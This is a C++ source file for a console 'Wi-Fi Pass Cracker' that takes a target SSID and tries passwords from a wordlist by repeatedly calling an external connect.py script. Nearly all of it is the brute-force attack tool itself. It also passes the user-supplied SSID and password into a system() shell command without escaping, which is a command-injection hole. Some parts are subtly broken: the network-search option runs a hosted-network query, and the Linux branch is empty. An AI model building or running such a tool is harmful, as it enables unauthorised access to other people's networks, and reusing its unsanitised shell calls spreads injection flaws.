// Import the necessary libraries
#include <iostream>
#include <string>
#include <cstdlib>
#include <windows.h>
#include <conio.h>
#include <fstream>
#include <cstdio>
#include <thread>
#include <vector>
#include <algorithm>
#include <random>
#include <chrono>
#include <set>

using namespace std;

// Define color constants
const string RED = "\033[91m";
const string GREEN = "\033[92m";
const string YELLOW = "\033[93m";
const string WHITE = "\033[37m";

// Function to print a dashed line with corners and color
void print_dash(char corner, char dash, int col, string color) {
    for (int index = 0; index < col; index++) {
        if (index == 0) {
            // Print the colored corner at the beginning of the line
            cout << color << corner;
        }
        else if (index == col - 1) {
            // Print the colored corner at the end of the line and reset color to white
            cout << corner << WHITE << endl;
        }
        else {
            // Print the dash character for the remaining part of the line
            cout << dash;
        }
    }
}

// Function to print a title within a framed box with alignment options
void print_title(char side, std::string line, int col, std::string side_color, std::string line_color, std::string align) {
    int line_length = line.length();  // Get the length of the title line

    // Adjust the column width to account for the title length
    col = col - line_length;

    for (int index = 0; index < col; index++) {
        if (align == "center") {  // Center alignment
            if (index == 0) {
                // Print the left side character with color
                cout << side_color << side << line_color;  
            }
            else if (index == col - 1) {
                // Print the right side character with color and reset color to white
                cout << side_color << " " << side << WHITE << endl;
            }
            else if (index < (col / 2) || index > (col / 2)) {
                // Print spaces until the middle of the column
                cout << " ";
            }
            else {
                // Print the title line in the middle
                cout << line;
            }
        }
        else if (align == "left") {  // Left alignment
            if (index == 0) {
                // Print the left side character with color
                cout << side_color << side << line_color;
            }
            else if (index == col - 1) {
                // Print the right side character with color and reset color to white
                cout << side_color << side << WHITE << endl;
            }
            else if (index > 1) {
                // Print spaces after the left side character
                cout << " ";
            }
            else {
                // Print the title line immediately after the left side character
                cout << " " << line;
            }
        }
        else if (align == "right") {  // Right alignment
            if (index == 0) {
                // Print the left side character with color
                cout << side_color << side << line_color;
            }
            else if (index == col - 1) {
                // Print the right side character with color and reset color to white
                cout << side_color << " " << side << WHITE << endl;
            }
            else if (index < col - 2) {
                // Print spaces until the column width minus 2
                cout << " ";
            }
            else {
                // Print the title line before the right side character
                cout << line;
            }
        }
        else {
            // Error message for invalid alignment
            cout << "Invalid alignment. Use \"left\", \"right\", or \"center\"." << endl;

            break;  // Exit the loop if alignment is invalid
        }
    }
}

// Function to delete previous lines from the console
void del_prev_line(int line) {
    for (int index = 0; index < line; index++) {
        // Move the cursor up one line
        cout << "\x1b[1A" << "\x1b[2K";
    }
}

// Function to generate a random string from a given character set
string random(vector<string>& pass_list) {
    // Check if the vector is empty; if so, throw an out_of_range exception
    if (pass_list.empty()) {
        throw out_of_range("Error: Failed to connect, no appropriate password");
    }

    // Use the current time as a seed for the random number generator
    unsigned seed = chrono::system_clock::now().time_since_epoch().count();

    // Shuffle the elements in the vector
    shuffle(pass_list.begin(), pass_list.end(), default_random_engine(seed));

    // Get the last element from the shuffled vector
    string pass = pass_list.back();

    // Remove the last element from the vector
    pass_list.pop_back();

    return pass;  // Return the random password
}

// Function to get the operating system (OS)
string get_OS() {
    #ifdef _WIN32
        return "win";  // Return "win" if the OS is Windows
    #elif __linux__
        return "linux";  // Return "linux" if the OS is Linux
    #endif
}

int main() {
    // Initialize random number generator
    CONSOLE_SCREEN_BUFFER_INFO csbi;

    // ASCII art lines to be printed as title
    string line1 = "  __      ___     ___ _   ___               ___             _             ";
    string line2 = "  \\ \\    / (_)___| __(_) | _ \\__ _ ______  / __|_ _ __ _ __| |_____ _ _   ";
    string line3 = "   \\ \\/\\/ /| |___| _|| | |  _/ _` (_-<_-< | (__| '_/ _` / _| / / -_) '_|  ";
    string line4 = "   \\_/\\_/ |_|   |_| |_| |_| \\__,_/__/__/  \\___|_| \\__,_\\__|_\\_\\___|_|  ";

    // Get the operating system type
    string OS = get_OS();
    
    int COL = 0;  // Variable to store the width of the console window

    // Get the console screen buffer information
    GetConsoleScreenBufferInfo(GetStdHandle(STD_OUTPUT_HANDLE), &csbi);

    // Calculate the width of the console window
    COL = csbi.srWindow.Right - csbi.srWindow.Left + 1;

    // Open the dataset
    ifstream dataset("dataset.txt");

    // Initialize a vector to store the lines from the file
    vector<string> pass_list;

    // Check if the file was opened successfully
    if (!dataset.is_open()) {
        // Print the error message if the file cannot be opened
        cerr << RED << "Error: Cannot open the file" << WHITE << endl;

        this_thread::sleep_for(chrono::seconds(3));  // Delay for 3 seconds

        del_prev_line(1);

        return 1;
    }

    string line;

    // Loop until the end of the file is reached
    while (!dataset.eof()) {
        getline(dataset, line);

        pass_list.push_back(line);  // Add the line to the vector
    }

    system("cls");

    // Print the top border of the title box
    print_dash('+', '=', COL, RED);

    // Print the ASCII art title centered in the box
    print_title('|', line1, COL, RED, YELLOW, "center");   
    print_title('|', line2, COL, RED, YELLOW, "center");  
    print_title('|', line3, COL, RED, YELLOW, "center");  
    print_title('|', line4, COL, RED, YELLOW, "center");  
    print_title('|', "", COL, RED, YELLOW, "center");  

    // Print the bottom border of the title box
    print_dash('+', '=', COL, RED);
    print_dash('+', '=', COL, WHITE);

    // Print version and developer information
    print_title('|', "Version: 1.0.0", COL, WHITE, WHITE, "left"); 
    print_title('|', "Dev: Jaggus Barrow", COL, WHITE, WHITE, "left"); 
    print_dash('+', '=', COL, WHITE);

    // Main loop to display and handle menu options
    while (true) {   
        int option = 0;

        // Display menu options
        cout << GREEN << "\nSelect an option:" << WHITE << endl;
        cout << "1. Search for nearby networks" << endl;
        cout << "2. Start brute force" << endl;
        cout << "3. Exit" << endl;

        // Prompt user for input
        cout << GREEN << "\nYour options: " << WHITE << endl;
        cin >> option;

        // Handle menu options
        if (option == 1) {
            del_prev_line(8);  // Delete previous lines from console

            // Set command based on operating system
            string wlan_show_cmd;
            string line;

            if (OS == "win") {
                wlan_show_cmd = "netsh wlan show hostednetwork > temp.bin";
            }
            else if (OS == "linux") {
                // TODO: Add command for linux
            }

            int result = system(wlan_show_cmd.c_str());  // Execute command
            int line_count = 0;
            
            // Open the temporary file
            ifstream file("temp.bin");

            // Check if command executed successfully
            if (result == 0) {
                if (file.is_open()) {
                    while (!file.eof())
                    {
                        getline(file, line);
                        
                        cout << line << endl;  // Print each line from the file

                        line_count += 1;
                    }
                }

                file.close();
            }

            remove("temp.bin");  // Remove temporary file
            
            cout << "\nPress any key to continue" << endl;
            
            _getch();  // Wait for user input
            del_prev_line(line_count + 2);  // Delete previous lines from console
        }
        else if (option == 2) {
            string SSID;
            string passwd;
            string num = "1";

            del_prev_line(8);  // Delete previous lines from console

            cout << GREEN << "\nEnter the network SSID: " << WHITE;

            cin.ignore();  // Ignore newline character from previous input

            getline(cin, SSID);  // Get SSID from user
            del_prev_line(1);  // Delete previous line

            int attemp = 0;

            while (num == "1") {
                try {
                    // Get a random password from the pass_list
                    passwd = random(pass_list);

                    attemp++;  // Increment the attempt counter
                }
                catch (const out_of_range& error) {
                    // Print the error message if there are no more passwords
                    cerr << RED << error.what() << WHITE << endl;

                    this_thread::sleep_for(chrono::seconds(3));  // Delay for 3 seconds

                    del_prev_line(1);

                    break;  // Break out of the loop
                }

                // Print the password being attempted and the attempt number
                cout << "Trying to use the password: " << passwd << endl;
                cout << "Attemp: " << attemp << endl;

                // Construct the command to run a Python script to connect to the network
                string connect_cmd = "python connect.py --ssid \"" + SSID + "\" --passwd \"" + passwd + "\"";

                system(connect_cmd.c_str());  // Execute Python script to connect to network

                // Open the log file to check the connection status
                ifstream file("log.bin");

                // If the file is open, read until the end of the file
                if (file.is_open()) {
                    while (!file.eof())
                    {
                        getline(file, num);
                    }
                }

                file.close();

                remove("log.bin");  // Remove log file

                int value = stoi(num);  // Convert string to integer

                // Check if connection was successful
                if (value == 0) {
                    cout << "Successfully connecting to the network" << endl;

                    this_thread::sleep_for(chrono::seconds(3));  // Delay for 3 seconds

                    del_prev_line(1);

                    break;  // Break out of the loop
                }

                del_prev_line(2);
            }
        }
        else if (option == 3) {
            system("cls");  // Clear the console

            break;  // Exit the loop
        }
        else {
            cout << YELLOW << "\nInvalid option, please try again" << WHITE << endl;
        }
    }
    
    return 0;
}
